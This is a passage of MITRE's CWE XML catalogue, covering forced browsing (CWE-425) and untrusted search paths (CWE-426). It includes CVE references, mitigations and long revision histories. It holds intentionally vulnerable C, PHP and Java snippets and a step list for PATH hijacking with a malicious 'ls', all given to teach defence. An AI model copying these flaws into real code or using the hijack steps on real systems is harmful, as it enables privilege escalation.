               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="425" Name="Direct Request ('Forced Browsing')" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The web application does not adequately enforce appropriate authorization on all restricted URLs, scripts, or files.</Description>
         <Extended_Description>Web applications susceptible to direct request attacks often make the false assumption that such resources can only be reached through a given navigation path and so only apply authorization at certain points in the path.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="862" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="862" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="288" View_ID="1000"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="424" View_ID="1000"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="471" View_ID="1000"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="98" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Class="Web Based" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>forced browsing</Term>
               <Description>The "forced browsing" term could be misinterpreted to include weaknesses such as CSRF or XSS, so its use is discouraged.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Scope>Access Control</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Modify Application Data</Impact>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Description>Apply appropriate access control authorizations for each access to all restricted URLs, scripts or files.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Consider using MVC based frameworks such as Struts.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>If forced browsing is possible, an attacker may be able to directly access a sensitive page by entering a URL similar to the following.</Intro_Text>
               <Example_Code Nature="Attack" Language="JSP">
                  <xhtml:div>http://somesite.com/someapplication/admin.jsp</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2022-29238</Reference>
               <Description>Access-control setting in web-based document collaboration tool is not properly implemented by the code, which prevents listing hidden directories but does not prevent direct requests to files in those directories.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-29238</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-23607</Reference>
               <Description>Python-based HTTP library did not scope cookies to a particular domain such that "supercookies" could be sent to any domain on redirect.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-23607</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-2144</Reference>
               <Description>Bypass authentication via direct request.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-2144</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1892</Reference>
               <Description>Infinite loop or infoleak triggered by direct requests.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1892</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-2257</Reference>
               <Description>Bypass auth/auth via direct request.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-2257</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1688</Reference>
               <Description>Direct request leads to infoleak by error.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1688</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1697</Reference>
               <Description>Direct request leads to infoleak by error.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1697</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1698</Reference>
               <Description>Direct request leads to infoleak by error.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1698</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1685</Reference>
               <Description>Authentication bypass via direct request.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1685</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1827</Reference>
               <Description>Authentication bypass via direct request.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1827</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1654</Reference>
               <Description>Authorization bypass using direct request.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1654</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1668</Reference>
               <Description>Access privileged functionality using direct request.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1668</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1798</Reference>
               <Description>Upload arbitrary files via direct request.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1798</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Direct Request aka 'Forced Browsing'</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A10</Entry_ID>
               <Entry_Name>Failure to Restrict URL Access</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A1</Entry_ID>
               <Entry_Name>Unvalidated Input</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A2</Entry_ID>
               <Entry_Name>Broken Access Control</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>34</Entry_ID>
               <Entry_Name>Predictable Resource Location</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP30</Entry_ID>
               <Entry_Name>Missing endpoint authentication</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="127"/>
            <Related_Attack_Pattern CAPEC_ID="143"/>
            <Related_Attack_Pattern CAPEC_ID="144"/>
            <Related_Attack_Pattern CAPEC_ID="668"/>
            <Related_Attack_Pattern CAPEC_ID="87"/>
         </Related_Attack_Patterns>
         <Notes>
            <Note Type="Relationship">Overlaps Modification of Assumed-Immutable Data (MAID), authorization errors, container errors; often primary to other weaknesses such as XSS and SQL injection.</Note>
            <Note Type="Theoretical">"Forced browsing" is a step-based manipulation involving the omission of one or more steps, whose order is assumed to be immutable. The application does not verify that the first step was performed successfully before the second step. The consequence is typically "authentication bypass" or "path disclosure," although it can be primary to all kinds of weaknesses, especially in languages such as PHP, which allow external modification of assumed-immutable variables.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Sean Eidemiller</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>added/updated demonstrative examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Relationships, Relationship_Notes, Taxonomy_Mappings, Theoretical_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Description, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Related_Attack_Patterns</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="426" Name="Untrusted Search Path" Abstraction="Base" Structure="Simple" Status="Stable">
         <Description>The product searches for critical resources using an externally-supplied search path that can point to resources that are not under the product's direct control.</Description>
         <Extended_Description>
            <xhtml:p>This might allow attackers to execute their own programs, access unauthorized data files, or modify configuration in unexpected ways. If the product uses a search path to locate critical resources such as programs, then an attacker could modify that search path to point to a malicious program, which the targeted product would then execute. The problem extends to any type of critical resource that the product trusts.</xhtml:p>
            <xhtml:p>Some of the most common variants of untrusted search path are:</xhtml:p>
               <xhtml:ul>
                  <xhtml:li>In various UNIX and Linux-based systems, the PATH environment variable may be consulted to locate executable programs, and LD_PRELOAD may be used to locate a separate library.</xhtml:li>
                  <xhtml:li>In various Microsoft-based systems, the PATH environment variable is consulted to locate a DLL, if the DLL is not found in other paths that appear earlier in the search order.</xhtml:li>
               </xhtml:ul>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="642" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="668" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="673" View_ID="1000"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="427" View_ID="1000"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="428" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Operating_System Class="Not OS-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Untrusted Path</Term>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>There is the potential for arbitrary code execution with privileges of the vulnerable program.</Note>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>DoS: Crash, Exit, or Restart</Impact>
               <Note>The program could be redirected to the wrong files, potentially triggering a crash or hang when the targeted file is too large or does not have the expected format.</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Files or Directories</Impact>
               <Note>The program could send the output of unauthorized files to the attacker.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-11">
               <Method>Black Box</Method>
               <Description>
                  <xhtml:p>Use monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic.</xhtml:p>
                  <xhtml:p>Attach the monitor to the process and look for library functions and system calls that suggest when a search path is being used. One pattern is when the program performs multiple accesses of the same file but in different directories, with repeated failures until the proper filename is found. Library calls such as getenv() or their equivalent can be checked to see if any path-related variables are being accessed.</xhtml:p>
               </Description>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis</Method>
               <Description>Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible.</Description>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Analysis</Method>
               <Description>Use tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session. These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.</Description>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Phase>Implementation</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>Hard-code the search path to a set of known-safe values (such as system directories), or only allow them to be specified by the administrator in a configuration file. Do not allow these settings to be modified by an external party. Be careful to avoid related weaknesses such as CWE-426 and CWE-428.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>When invoking other programs, specify those programs using fully-qualified pathnames. While this is an effective approach, code that uses fully-qualified pathnames might not be portable to other systems that do not use the same pathnames. The portability can be improved by locating the full-qualified paths in a centralized, easily-modifiable location within the source code, and having the code refer to these paths.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Remove or restrict all environment settings before invoking other programs. This includes the PATH environment variable, LD_LIBRARY_PATH, and other settings that identify the location of code libraries, and any application-specific search paths.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Check your search path before use and remove any elements that are likely to be unsafe, such as the current working directory or a temporary files directory.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Use other functions that require explicit paths. Making use of any of the other readily available functions that require explicit paths is a safe way to avoid this problem. For example, system() in C does not require a full path since the shell can take care of it, while execl() and execv() require a full path.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-67">
               <Intro_Text>This program is intended to execute a command that lists the contents of a restricted directory, then performs other actions. Assume that it runs with setuid privileges in order to bypass the permissions check by the operating system.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>#define DIR "/restricted/directory"<xhtml:br/>
                     <xhtml:br/>char cmd[500];<xhtml:br/>sprintf(cmd, "ls -l %480s", DIR);<xhtml:br/>
                     <xhtml:i>/* Raise privileges to those needed for accessing DIR. */</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>RaisePrivileges(...);<xhtml:br/>system(cmd);<xhtml:br/>DropPrivileges(...);<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>This code may look harmless at first, since both the directory and the command are set to fixed values that the attacker can't control. The attacker can only see the contents for DIR, which is the intended program behavior. Finally, the programmer is also careful to limit the code that executes with raised privileges.</Body_Text>
               <Body_Text>However, because the program does not modify the PATH environment variable, the following attack would work:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:ul>
                     <xhtml:li>The user sets the PATH to reference a directory under the attacker's control, such as "/my/dir/".</xhtml:li>
                     <xhtml:li>The attacker creates a malicious program called "ls", and puts that program in /my/dir</xhtml:li>
                     <xhtml:li>The user executes the program.</xhtml:li>
                     <xhtml:li>When system() is executed, the shell consults the PATH to find the ls program</xhtml:li>
                     <xhtml:li>The program finds the attacker's malicious program, "/my/dir/ls". It doesn't find "/bin/ls" because PATH does not contain "/bin/".</xhtml:li>
                     <xhtml:li>The program executes the attacker's malicious program with the raised privileges.</xhtml:li>
                  </xhtml:ul>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-68">
               <Intro_Text>This code prints all of the running processes belonging to the current user.</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>
                     <xhtml:br/>
                     <xhtml:i>//assume getCurrentUser() returns a username that is guaranteed to be alphanumeric (avoiding CWE-78)</xhtml:i>
                     <xhtml:br/>$userName = getCurrentUser();<xhtml:br/>$command = 'ps aux | grep ' . $userName;<xhtml:br/>system($command);</xhtml:div>
               </Example_Code>
               <Body_Text>If invoked by an unauthorized web user, it is providing a web page of potentially sensitive information on the underlying system, such as command-line arguments (CWE-497). This program is also potentially vulnerable to a PATH based attack (CWE-426), as an attacker may be able to create malicious versions of the ps or grep commands. While the program does not explicitly raise privileges to run the system commands, the PHP interpreter may by default be running with higher privileges than users.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-29">
               <Intro_Text>The following code is from a web application that allows users access to an interface through which they can update their password on the system. In this environment, user passwords can be managed using the Network Information System (NIS), which is commonly used on UNIX systems. When performing NIS updates, part of the process for updating passwords is to run a make command in the /var/yp directory. Performing NIS updates requires extra privileges.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>...<xhtml:br/>System.Runtime.getRuntime().exec("make");<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The problem here is that the program does not specify an absolute path for make and does not clean its environment prior to executing the call to Runtime.exec(). If an attacker can modify the $PATH variable to point to a malicious binary called make and cause the program to be executed in their environment, then the malicious binary will be loaded instead of the one intended. Because of the nature of the application, it runs with the privileges necessary to perform system operations, which means the attacker's make will now be run with these privileges, possibly giving the attacker complete control of the system.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-1999-1120</Reference>
               <Description>Application relies on its PATH environment variable to find and execute program.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-1999-1120</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-1810</Reference>
               <Description>Database application relies on its PATH environment variable to find and execute program.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-1810</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-2027</Reference>
               <Description>Chain: untrusted search path enabling resultant format string by loading malicious internationalization messages.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-2027</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3485</Reference>
               <Description>Untrusted search path using malicious .EXE in Windows environment.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3485</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2613</Reference>
               <Description>setuid program allows compromise using path that finds and loads a malicious library.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-2613</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-1319</Reference>
               <Description>Server allows client to specify the search path, which can be modified to point to a program that the client has uploaded.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-1319</Link>
            </Observed_Example>
         </Observed_Examples>
         <Functional_Areas>
            <Functional_Area>Program Invocation</Functional_Area>
            <Functional_Area>Code Libraries</Functional_Area>
         </Functional_Areas>
         <Affected_Resources>
            <Affected_Resource>System Process</Affected_Resource>
         </Affected_Resources>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Untrusted Search Path</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>Relative path library search</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>ENV03-C</Entry_ID>
               <Entry_Name>Sanitize the environment when invoking external programs</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="38"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-18"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 10, Process Attributes, page 603"/>
            <Reference External_Reference_ID="REF-176" Section="Chapter 8, &#34;Canonical Representation Issues.&#34; Page 229"/>
            <Reference External_Reference_ID="REF-207" Section="Chapter 12, &#34;Trust Management and Input Validation.&#34; Pages&#xA;                  317-320."/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 11, &#34;Don't Trust the PATH - Use Full Path Names&#34; Page 385"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Description, Observed_Examples, Potential_Mitigations, Relationships, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Description, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Detection_Factors, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Modes_of_Introduction, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, References, Relationships, Type</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
